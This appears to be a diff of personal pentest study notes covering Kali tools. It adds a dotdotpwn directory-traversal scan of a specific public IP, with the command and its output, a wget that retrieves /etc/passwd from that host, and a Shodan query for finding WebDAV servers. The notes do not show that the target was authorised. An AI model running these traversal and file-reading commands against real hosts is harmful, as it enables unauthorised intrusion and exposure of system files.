@@ -345,14 +345,67 @@
 
      ⭐  ~  ok  at 12:59:33 >                                                                                           
     
-    dotdotpwn. scan In progress
+    # dotdotpwn. 
     
         https://www.kali.org/tools/dotdotpwn/
         
-        
+    > sudo dotdotpwn -m http -h 156.242.11.17 -M GET -b -q -r host_156_242_11_17.txt -t 100
+    #################################################################################
+    #                                                                               #
+    #  CubilFelino                                                       Chatsubo   #
+    #  Security Research Lab              and            [(in)Security Dark] Labs   #
+    #  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #
+    #                                                                               #
+    #                               pr0udly present:                                #
+    #                                                                               #
+    #  ________            __  ________            __  __________                   #
+    #  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #
+    #   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #
+    #   |    `   \(  <_> )|  |  |    `   \(  <_> )|  |  |    |     \     /|   |  \  #
+    #  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #
+    #          \/                      \/                                      \/   #
+    #                              - DotDotPwn v3.0.2 -                             #
+    #                         The Directory Traversal Fuzzer                        #
+    #                         http://dotdotpwn.sectester.net                        #
+    #                            dotdotpwn@sectester.net                            #
+    #                                                                               #
+    #                               by chr1x & nitr0us                              #
+    #################################################################################
+
+    [+] Report name: Reports/host_156_242_11_17.txt
+
+    [========== TARGET INFORMATION ==========]
+    [+] Hostname: 156.242.11.17
+    [+] Protocol: http
+    [+] Port: 80
+
+    [=========== TRAVERSAL ENGINE ===========]
+    [+] Creating Traversal patterns (mix of dots and slashes)
+    [+] Multiplying 6 times the traversal patterns (-d switch)
+    [+] Creating the Special Traversal patterns
+    [+] Translating (back)slashes in the filenames
+    [+] Adapting the filenames according to the OS type detected (unix)
+    [+] Including Special sufixes
+    [+] Traversal Engine DONE ! - Total traversal tests created: 11028
+
+    [=========== TESTING RESULTS ============]
+    [+] Ready to launch 10.00 traversals per second
+    [+] Press Enter to start the testing (You can stop it pressing Ctrl + C)
+    ...
+    [*] Testing Path: http://156.242.11.17:80/.?/etc/passwd <- VULNERABLE!
+
+    [+] Fuzz testing finished after 12.10 minutes (726 seconds)
+    [+] Total Traversals found: 1
+    [+] Report saved: Reports/host_156_242_11_17.txt
+    > wget http://156.242.11.17:80/.\?/etc/passwd
+    --2022-08-16 16:40:17--  http://156.242.11.17/?/etc/passwd
+    Connecting to 156.242.11.17:80... connected.
+    HTTP request sent, awaiting response... 200 OK
+    ...
+    
     view source ??? preguntar a Isra
     
-    davtest
+    # davtest
     
         You can upload files to a vulnerable webdav server using this.
         WebDav se usa para compartir ficheros en un servidor web, como un ftp, pero sobre la web.
@@ -408,7 +461,7 @@
         
         https://beta.shodan.io/search?query=%28Win32%29+DAV%2F2
         
-    cadevar
+    # cadaver
     
     droopscan
     joomscan
